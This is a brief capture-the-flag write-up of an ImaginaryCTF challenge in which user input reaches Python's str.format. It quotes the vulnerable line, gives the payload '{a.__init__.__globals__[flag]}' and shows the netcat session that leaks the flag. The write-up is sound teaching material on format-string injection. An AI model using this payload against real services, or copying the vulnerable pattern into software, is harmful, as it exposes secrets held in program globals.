# ImaginaryCTF Formatting Write Up

## Details:

Jeopardy style CTF

Category: Miscellaneous

Points: 100

Comments: Wait, I thought format strings were only in C???

## Write up:

Looking at the file (and description) I could tell that this was a format string vulnerability. Looking at the line with the format string we see:

```py
print(inp.format(a=stonkgenerator()))
```

We are passed an object a which is of type stonkgenerator, from here we can craft the exploit:

```py
{a.__init__.__globals__[flag]}
```

When run with the nc connection I got:

```
nc chal.imaginaryctf.org 42014

                                         88
            ,d                           88
            88                           88
,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,  88   ,d8  ,adPPYba,
I8[    ""   88   a8"     "8a 88P'   `"8a 88 ,a8"   I8[    ""
 `"Y8ba,    88   8b       d8 88       88 8888[      `"Y8ba,
aa    ]8I   88,  "8a,   ,a8" 88       88 88`"Yba,  aa    ]8I
`"YbbdP"'   "Y888 `"YbbdP"'  88       88 88   `Y8a `"YbbdP"'

Welcome to Stonks as a Service!
Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!
> {a.__init__.__globals__[flag]}
ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}
```